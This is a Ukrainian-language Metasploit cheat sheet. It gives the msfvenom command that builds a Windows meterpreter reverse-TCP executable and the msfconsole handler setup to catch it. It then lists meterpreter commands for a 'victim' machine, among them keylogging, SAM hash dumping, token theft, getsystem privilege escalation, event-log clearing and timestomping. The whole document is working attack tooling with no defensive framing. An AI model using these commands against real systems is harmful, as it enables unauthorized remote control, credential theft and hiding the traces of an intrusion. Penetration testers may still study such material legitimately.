## Створення payload:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -a x64 -o /home/kali/payload.exe

## Запуск:

msfconsole  
use exploit/multi/handler  
set PAYLOAD windows/x64/meterpreter/reverse_tcp  
set LHOST 192.168.0.111  
set LPORT 8888  
run  

## Основні команди Meterpreter:

**?** — меню допомоги  
**background** — переносить поточний сеанс в фоновий режим.  
**bgkill** — завершує фоновий скрипт meterpreter.  
**bglist** — відображає список всіх запущених фонових скриптів.  
**bgrun** — запускає скрипт як фоновий потік.  
**channel**  — відображає активні канали.  
**close** — закриває канал.  
**exit** — завершує севнс роботи з meterpreter.  
**help** — меню довідки.  
**interact** — взаємодіє з каналом.  
**irb** — перейти в режим сценарію Ruby.  
**migrate** — переносить активний процес на указаний PID.  
**quit** — завершує сеанс meterpreter.  
**read** — читає дані з каналу.  
**run** — виконує створений після нього скрипт meterpreter.  
**use** — завантажує розширення meterpreter.  
**write** — записує дані в канал.  

## Команди файлової системи

**cat** — читання і виведення вмісту файлу.  
**cd** — перейти в папку.  
**del** — видалити файл.  
**download** — завантажити файл з системи на свій ПК.  
**edit** — редагувати файл за допомогою vim.  
**getlwd** — показати локальний каталог.  
**getwd** — показати робочий каталог.  
**lcd** — змінити локальний каталог.  
**lpwd** — відобразити шлях локальної директорії.  
**ls** — список файлів в поточному каталозі.  
**mkdir** — створити каталог.  
**pwd** — відобразити шлях кореневого каталогу до до поточного робочого каталогу.  
**rm** — видалити файл.  
**rmdir** — видалити каталог в жертви.  
**upload** — завантажити файл зі своєї системи на на поточну машину.  

## Мережеві команди Meterpreter:

**clearav** — очищуэ журнал подый на комп'ютері жертви.  
**execute** — виконує команду.  
**getpid** — отримує ідентифікатор поточного процесу (PID).  
**getprivs** — отримує максимально можливі привілегії.  
**getuid** — отримати користувача від якого запущений сервер.  
**kill** — завершити процес, позначений PID.  
**ps** — список запущених процесів.  
**reboot** — перезавантажує комп'ютер жертви.  
**reg** — взаємодіяти з реєстром жертви.  
**rev2self** — викликає RevertToSelf () на машині жертви.  
**shell** — відкриває командний рядок на машині жертви.  
**shutdown** — виключає комп'ютер жертви.  
**steal_token** — намгається викрасти токен вказаного (PID) процесу.  
**sysinfo** — отримує детальну інформацію про комп'ютер жертви, таку ​як ОС і ім'я комп'ютера.  

## Команди користувацького інтерфейсу:  
**enumdesktops** — список всіх доступних робочих столів.  
**getdesktop** —отримати поточний робочий стіл meterpreter.  
**idletime** — перевіряє, скільки часу система жертви була в простої.  
**keyscan_dump** — вивантажує змість програмного забезпечення келогеру.  
**keyscan_start** — запускає програмний кейлогер, коли він звязаний з процесом, таким як Word чи браузер.  
**keyscan_stop** — зупиняє програмний кейлогер.  
**screenshot** — робить знімок екрану робочого столу meterpreter.  
**set_desktop** — змінює робочий стіл meterpreter.  
**uictl** — дозволяє керувати деякими компонентами користувацького інтерфейсу.  

## Команди підвищення привілеїв:  

**getsystem** — використовує 15 встроєних методів для отримання привілеїв системного адміністратора.  

## Команди дампу пароля:  

**hashdump** — захватє хеши з файлу паролів (SAM).  

## Команди Timestomp:  

**timestomp** — керує зміною, доступом і створеням атрибутів файлу.  


